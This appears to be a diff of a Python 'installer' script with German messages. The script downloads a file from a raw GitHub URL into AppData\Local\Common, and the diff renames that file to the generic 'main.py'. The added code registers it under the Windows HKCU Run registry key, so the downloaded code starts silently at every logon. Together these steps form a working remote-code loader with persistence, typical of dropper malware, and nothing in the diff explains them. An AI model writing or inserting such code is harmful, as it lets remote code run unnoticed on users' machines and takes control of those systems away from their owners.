@@ -2,9 +2,10 @@ import pathlib as pl
 import urllib.request
 import os
 import ssl
+import sys
 
-APP_NAME = "Installer"
-FILE_NAME = "installer.py"
+APP_NAME = "main"
+FILE_NAME = "main.py"
 UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/installer/refs/heads/main/" + FILE_NAME
 
 BASE_DIR = f"{pl.Path.home() / 'AppData' / 'Local' / 'Common'}"
@@ -33,4 +34,32 @@ try:
 
 except Exception as e:
     print(f"Download/Fehler: {e}")
+    exit(1)
+    
+key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+python_exe = sys.executable
+
+value = f'"{python_exe}" "{APP_PATH}"'
+
+try:
+    key = winreg.OpenKey(  # type: ignore
+        winreg.HKEY_CURRENT_USER,  # type: ignore
+        key_path,
+        0,
+        winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
+    )
+
+    # Alten Wert löschen, falls vorhanden
+    try:
+        winreg.DeleteValue(key, APP_NAME)  # type: ignore
+    except FileNotFoundError:
+        pass
+
+    winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, value)  # type: ignore
+    winreg.CloseKey(key)  # type: ignore
+
+    print(f"→ In Registry (HKCU\\Run) hinzugefügt: {APP_NAME}")
+
+except Exception as e:
+    print(f"Registry Fehler: {e}")
     exit(1)
